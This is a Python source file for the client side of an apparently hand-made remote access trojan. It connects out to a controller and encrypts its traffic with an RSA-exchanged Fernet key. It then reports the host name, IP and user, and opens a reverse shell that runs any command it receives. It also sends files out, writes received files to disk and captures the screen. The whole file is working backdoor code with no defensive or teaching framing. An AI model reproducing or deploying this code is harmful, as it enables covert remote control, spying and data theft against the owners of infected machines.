import socket
import os
import time
import subprocess
import mss
import rsa
from cryptography.fernet import Fernet



address = ("0.0.0.0", 3000)
authed = False

def take_screen_shot():
    if mss.mss().monitors:
        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
        send(img_data)

    else:
        send(b'')

def get_info():
    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"Dunno🤷🏻‍♂️"}"""
    send(description.encode())

def recv(buff_size=1024):
    data_buff = bytes()
    data_size = server_con.recv(12)

    if len(data_size) > 0:
        data_size = int(data_size.decode().rstrip())
    else:
        return None

    while len(data_buff) < data_size:
        data_buff += server_con.recv(buff_size)
        
    return decrypt(data_buff) if authed else data_buff


def send(data, header_size=12):
    if authed:
        data = encrypt(data)
    data_size = f"{len(data):<{header_size}}"
    server_con.sendall(data_size.encode()+data)

def upload_file(file_name):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()
            send(file_data)

    except:
        print("Error opening file")
        send(b'')

def download_file(file_name, file_path):
    file_data = recv(buff_size=32768)
    if not file_data:
        print("Could not download file...")
        return

    try:
        file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
        file.write(file_data)
        file.close()

    except OSError as e:
        print(e)

def open_shell():
    while True:
        print("waiting for cmd...")
        cmd = recv()
        str_msg = b""

        if not cmd:
            continue

        cmd = cmd.decode()

        if cmd == "exit":
            break

        elif cmd[:2] == "cd":
            dir = cmd[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError as e:
                str_msg = str(e).encode()
            else:
                str_msg = os.getcwd().encode()

        elif cmd[:2] == "dw":
            file_name = cmd[3:]
            print(f"Uploading File...{file_name}")
            upload_file(file_name)
            continue

        elif cmd[:2] == "up":
            file_name = cmd[3:]
            print(f"Downloading File...{file_name}")
            download_file(file_name=file_name, file_path=os.getcwd())
            continue

        else:
            output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            str_msg = output[0] + output[1] 



        send(str_msg)


def encrypt(data):
    return lck.encrypt(data)

def decrypt(encrypted_data):
    return lck.decrypt(encrypted_data)


def establish_connection(address):
    global server_con, authed, lck
    public_key, private_key = rsa.newkeys(512)

    print("Connecting...")
    while not authed:
        server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_con.connect((address[0],address[1]))
        print(f"Connected!\nServer: {address[0]}:{address[1]}")

        public_key_buff = public_key.save_pkcs1('PEM')
        send(public_key_buff)

        key = rsa.decrypt(recv(), private_key)
        lck = Fernet(key)
        if lck:
            send(lck.encrypt(b'\n\nOK\n\n'))
            authed = True
        

def kill_connection():
    server_con.shutdown(socket.SHUT_WR)
    server_con.close()

def main():
    establish_connection(address)
    get_info()

    while True:
        choice = recv().decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "3":
            pass
        elif choice == "4":
            keep_alive = recv().decode().lower()
            if keep_alive == "y" or keep_alive == "yes":
                server_con.shutdown(socket.SHUT_WR)
                server_con.close()
                time.sleep(5)
                establish_connection(address)
            else:
                break


    kill_connection()

main()
